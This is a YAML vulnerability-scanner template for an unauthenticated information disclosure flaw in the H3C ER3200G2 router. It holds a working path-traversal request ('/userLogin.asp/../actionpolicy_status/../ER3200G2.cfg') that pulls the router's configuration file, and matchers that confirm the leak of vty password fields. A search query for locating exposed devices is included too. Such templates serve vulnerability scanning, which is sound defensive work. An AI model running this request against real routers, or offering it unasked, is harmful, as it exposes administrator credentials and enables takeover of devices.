http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - vtypasswd=
            - vtypasswdtype=
            - vtyname=
            - H3C
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          GET /userLogin.asp/../actionpolicy_status/../ER3200G2.cfg HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
id: H3C-ER3200G2-Information-disclosure
info:
    author: Superhero
    description: |-
        Hunter: app.name="H3C Router Management"
        H3C ER3200G2路由器 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，从而登录后台，使系统处于极不安全的状态。
    name: H3C ER3200G2路由器 信息泄露漏洞
    reference:
        - https://mp.weixin.qq.com/s/UQdYaGdPthMDlAc0AW_XLw
    severity: high
    tags:
        - Information disclosure
